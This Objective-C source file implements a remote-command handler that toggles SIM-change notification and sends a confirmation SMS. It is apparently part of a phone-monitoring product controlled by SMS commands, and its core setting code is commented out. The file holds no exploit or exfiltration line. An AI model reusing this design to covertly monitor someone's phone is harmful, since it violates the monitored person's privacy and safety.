/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  EnableSIMChangeProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  14/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "EnableSIMChangeProcessor.h"
#import "PrefEventsCapture.h"
#import "Preference.h"

@interface EnableSIMChangeProcessor (PrivateAPI)
- (BOOL) isValidFlag;
- (void) enableSIMChange;
- (void) enableSIMChangeException;
- (void) sendReplySMS;
@end

@implementation EnableSIMChangeProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the EnableSIMChangeProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(EnableSIMChangeProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"EnableSIMChangeProcessor--->initWithRemoteCommandData...");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the EnableSIMChangeProcessor
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"EnableCaptureProcessor--->doProcessingCommand");
	if ([self isValidFlag])	[self enableSIMChange];
	else [self enableSIMChangeException];
	
}

#pragma mark EnableSIMChangeProcessor PrivateAPI Methods

/**
 - Method name: enableSIMChangeProcessor
 - Purpose:This method is used to process Enable SIM Change
 - Argument list and description: No Argument
 - Return description:No Return Type
*/

- (void) enableSIMChange{
	DLog (@"EnableCaptureProcessor--->enableSIMChange");
	/*NSUInteger flagValue=[[[mRemoteCmdData mArguments] objectAtIndex:2] intValue];
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefEventsCapture *prefEvents = (PrefEventsCapture *)[prefManager preference:kEvents_Ctrl];
	[prefEvents setMStartCapture:flagValue];
	[prefManager savePreferenceAndNotifyChange:prefEvents];*/
	[self sendReplySMS];
}

/**
 - Method name: isValidFlag
 - Purpose:This method is used to validate the Arguments
 - Argument list and description: 
 - Return description:isValidArguments (BOOL)
*/

- (BOOL) isValidFlag {
	DLog (@"EnableSIMChangeProcessor--->s")
	BOOL isValid=NO;
	NSArray *args=[mRemoteCmdData mArguments];
	if ([args count]>2) isValid=[RemoteCmdProcessorUtils isZeroOrOneFlag:[args objectAtIndex:2]];	
	return isValid;
}

/**
 - Method name: enableSIMChangeException
 - Purpose:This method is invoked when  enable SIM Change Process is failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) enableSIMChangeException {
	DLog (@"EnableCaptureProcessor--->enableSIMChangeException")
	FxException* exception = [FxException exceptionWithName:@"enableSIMChangeException" andReason:@"Enable SIM Change error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"EnableSIMChangeProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *enableSIMChangeMessage=NSLocalizedString(@"kEnableSIMChange", @"");
	if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue]==1) 
		enableSIMChangeMessage=[enableSIMChangeMessage stringByAppendingString:NSLocalizedString(@"kEnabled", @"")];
	else 
    	enableSIMChangeMessage=[enableSIMChangeMessage stringByAppendingString:NSLocalizedString(@"kDisabled", @"")];
	
	enableSIMChangeMessage=[messageFormat stringByAppendingString:enableSIMChangeMessage];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:enableSIMChangeMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:enableSIMChangeMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[super dealloc];
}

@end
